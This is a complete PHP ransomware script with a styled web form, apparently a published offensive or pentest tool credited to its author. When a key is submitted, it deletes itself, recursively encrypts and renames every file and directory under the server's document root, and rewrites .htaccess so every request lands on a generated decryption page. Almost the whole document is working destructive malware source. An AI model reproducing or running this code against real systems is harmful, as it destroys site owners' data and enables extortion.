
<?php

error_reporting(0);

class Ransomware {

    private $root = '';

    private $originalKey = '';

    private $cryptoKey = '';

    private $algorithm = 'sha512';

    private $iv = '';

    private $cipher = 'AES-256-CBC';

    private $extension = 'ransom';

    public function __construct($key) {

        $this->root = $_SERVER['DOCUMENT_ROOT'];

        $this->originalKey = $key;

        $this->cryptoKey = hash($this->algorithm, $key);

        $this->iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length($this->cipher));

    }

    private function generateRandomName($dir, $extension) {

        do {

            $rand = str_replace(array('+', '/', '='), '', base64_encode(openssl_random_pseudo_bytes(6)));

            $name = $dir . '/' . $rand . '.' . $extension;

        } while (file_exists($name));

        return $name;

    }

    private function createDecryptionFiles() {

        // decryption file encoded in base64

        $data = base64_decode('');

        $data = str_replace(array('<root>', '<originalKey>', '<algorithm>', '<iv>', '<cipher>', '<extension>'), array($this->root, $this->originalKey, $this->algorithm, base64_encode($this->iv), $this->cipher, $this->extension), $data);

        $decryptionFile = $this->generateRandomName($this->root, 'php');

        file_put_contents($decryptionFile, $data);

        $decryptionFile = pathinfo($decryptionFile, PATHINFO_BASENAME);

        file_put_contents($this->root . '/.htaccess', "DirectoryIndex /{$decryptionFile}\nErrorDocument 403 /{$decryptionFile}\nErrorDocument 404 /{$decryptionFile}\n");

    }

    private function encryptName($path) {

        do {

            $encryptedName = urlencode(openssl_encrypt(pathinfo($path, PATHINFO_BASENAME), $this->cipher, $this->cryptoKey, 0, $this->iv));

            $encryptedName = substr($path, 0, strripos($path, '/') + 1) . $encryptedName . '.' . $this->extension;

        } while (file_exists($encryptedName));

        return $encryptedName;

    }

    private function encryptFile($file) {

        $encryptedFile = $this->encryptName($file);

        if (rename($file, $encryptedFile)) {

            $encryptedData = openssl_encrypt(file_get_contents($encryptedFile), $this->cipher, $this->cryptoKey, 0, $this->iv);

            if (file_exists($encryptedFile)) {

                file_put_contents($encryptedFile, $encryptedData);

            }

        }

    }

    private function encryptDirectory($dir) {

        rename($dir, $this->encryptName($dir));

    }

    private function scan($dir) {

        $files = array_diff(scandir($dir), array('.', '..'));

        foreach ($files as $file) {

            if (is_dir($dir . '/' . $file)) {

                $this->scan($dir . '/' . $file);

                $this->encryptDirectory($dir . '/' . $file);

            } else {

                $this->encryptFile($dir . '/' . $file);

            }

        }

    }

    public function run() {

        unlink($_SERVER['SCRIPT_FILENAME']);

        $this->scan($this->root);

        $this->createDecryptionFiles();

    }

} $errorMessages = array('key' => '');

if (isset($_SERVER['REQUEST_METHOD']) && strtolower($_SERVER['REQUEST_METHOD']) === 'post') {

    if (isset($_POST['submit']) && isset($_POST['key'])) {

        $parameters = array('key' => $_POST['key']);

        mb_internal_encoding('UTF-8');

        $error = false;

        if (mb_strlen($parameters['key']) < 1) {

            $errorMessages['key'] = 'Please enter encryption key';

            $error = true;

        }

        if (!$error) {

            $ransomware = new Ransomware($parameters['key']);

            $ransomware->run();

            header('Location: /');

            exit();

        }

    }

}

?>

<!DOCTYPE html>

<html lang="en">

	<head>

		<meta charset="UTF-8">

		<title>Ransomware</title>

		<meta name="description" content="PHP ransomware.">

		<meta name="keywords" content="HTML, CSS, PHP, ransomware">

		<meta name="author" content="Ivan Šincek">

		<meta name="viewport" content="width=device-width, initial-scale=1.0">

		<style>

			html {

				height: 100%;

			}

			body {

				background-color: #262626;

				display: flex;

				flex-direction: column;

				margin: 0;

				height: inherit;

				color: #F8F8F8;

				font-family: "Armata", sans-serif;

				font-size: 1em;

				font-weight: 400;

				text-align: left;

			}

			.front-form {

				display: flex;

				flex-direction: column;

				align-items: center;

				justify-content: center;

				flex: 1 0 auto;

				padding: 0.5em;

			}

			.front-form .layout {

				background-color: #DCDCDC;

				padding: 1.5em;

				width: 21em;

				color: #000;

				border: 0.07em solid #000;

			}

			.front-form .layout header {

				text-align: center;

			}

			.front-form .layout header .title {

				margin: 0;

				font-size: 2.6em;

				font-weight: 400;

			}

			.front-form .layout header p {

				margin: 0;

				font-size: 1.2em;

			}

			.front-form .layout .advice p {

				margin: 1em 0 0 0;

			}

			.front-form .layout form {

				display: flex;

				flex-direction: column;

				margin-top: 1em;

			}

			.front-form .layout form input {

				-webkit-appearance: none;

				-moz-appearance: none;

				appearance: none;

				margin: 0;

				padding: 0.2em 0.4em;

				font-family: "Armata", sans-serif;

				font-size: 1em;

				border: 0.07em solid #9D2A00;

				-webkit-border-radius: 0;

				-moz-border-radius: 0;

				border-radius: 0;

			}

			.front-form .layout form input[type="submit"] {

				background-color: #FF4500;

				color: #F8F8F8;

				cursor: pointer;

				transition: background-color 220ms linear;

			}

			.front-form .layout form input[type="submit"]:hover {

				background-color: #D83A00;

				transition: background-color 220ms linear;

			}

			.front-form .layout form .error {

				margin: 0 0 1em 0;

				color: #9D2A00;

				font-size: 0.8em;

			}

			.front-form .layout form .error:not(:empty) {

				margin: 0.2em 0 1em 0;

			}

			.front-form .layout form label {

				margin-bottom: 0.2em;

				height: 1.2em;

			}

			@media screen and (max-width: 480px) {

				.front-form .layout {

					width: 15.5em;

				}

			}

			@media screen and (max-width: 320px) {

				.front-form .layout {

					width: 14.5em;

				}

				.front-form .layout header .title {

					font-size: 2.4em;

				}

				.front-form .layout header p {

					font-size: 1.1em;

				}

				.front-form .layout .advice p {

					font-size: 0.9em;

				}

			}

		</style>

	</head>

	<body>

		<div class="front-form">

			<div class="layout">

				<header>

					<h1 class="title">Ransomware</h1>

					<p>Made by Ivan Šincek</p>

				</header>

				<form method="post" action="<?php echo './' . pathinfo($_SERVER['SCRIPT_FILENAME'], PATHINFO_BASENAME); ?>">

					<label for="key">Encryption Key</label>

					<input name="key" id="key" type="text" spellcheck="false" autofocus="autofocus">

					<p class="error"><?php echo $errorMessages['key']; ?></p>

					<input name="submit" type="submit" value="Encrypt">

				</form>

				<div class="advice">

					<p>Backup your server files!</p>

				</div>

			</div>

		</div>

	</body>

</html>
